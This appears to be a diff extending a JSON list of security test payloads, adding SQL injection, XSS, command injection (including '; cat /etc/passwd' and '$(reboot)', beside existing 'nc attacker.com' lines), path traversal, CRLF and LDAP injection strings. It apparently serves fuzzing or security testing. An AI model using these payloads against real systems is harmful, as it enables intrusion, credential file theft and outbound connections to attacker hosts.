@@ -26,7 +26,11 @@
       "') OR ('1'='1'--",
       "' UNION SELECT 1, @@version--",
       "' AND updatexml(1,concat(0x7e,version()),1)--",
-      "' OR pg_sleep(5)--"
+      "' OR pg_sleep(5)--",
+      "' UNION SELECT 1, version(), current_user()",
+      "' OR '1'='1' -- ",
+      "admin' --",
+      "ORDER BY 1--"
     ],
     "xss": [
       "<script>alert('XSS')</script>",
@@ -47,7 +51,11 @@
       "<form action=\"javascript:alert('XSS')\"><input type=submit>",
       "<math><maction xlink:href=\"javascript:alert('XSS')\">click</maction></math>",
       "<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>",
-      "<img src=1 onerror=alert`XSS`>"
+      "<img src=1 onerror=alert`XSS`>",
+      "<svg/onload=alert(1)>",
+      "javascript://%250Aalert(1)",
+      "<img src=x onerror=alert(1)>",
+      "'-alert(1)-'"
     ],
     "command_injection": [
       "; ls -la",
@@ -66,14 +74,21 @@
       "` id `",
       "${IFS}cat${IFS}/etc/passwd",
       "; curl attacker.com",
-      "| nc attacker.com 1234"
+      "| nc attacker.com 1234",
+      "; cat /etc/passwd",
+      "| whoami",
+      "$(reboot)",
+      "&& sleep 10"
     ],
     "path_traversal": [
       "../../../etc/passwd",
       "..\\..\\..\\windows\\system32\\config\\sam",
       "....//....//....//etc/passwd",
       "/etc/passwd%00",
-      "..%2F..%2F..%2Fetc%2Fpasswd"
+      "..%2F..%2F..%2Fetc%2Fpasswd",
+      "....//....//etc/passwd",
+      "%2e%2e%2fetc%2fpasswd",
+      "..%c0%af..%c0%afetc/passwd"
     ],
     "special_characters": [
       "null",
@@ -143,7 +158,9 @@
       "\\nContent-Length: 0",
       "\\nSet-Cookie: admin=true",
       ";Content-Length: 0",
-      ",Content-Length: 0"
+      ",Content-Length: 0",
+      "%0d%0aSet-Cookie: crlf=injection",
+      "\\r\\nLocation: http://evil.com"
     ],
     "ldap_injection": [
       "*",
@@ -165,7 +182,9 @@
       "*)(|(uid=*)(!(uid=*)))",
       "*)(&(mail=*)(uid=*))",
       "*)(|(samAccountName=*))",
-      "*)(&(objectCategory=person)(cn=*))"
+      "*)(&(objectCategory=person)(cn=*))",
+      ")(uid=*))(|(uid=*",
+      "(|(userPassword=*))"
     ]
   },
   "notes": [
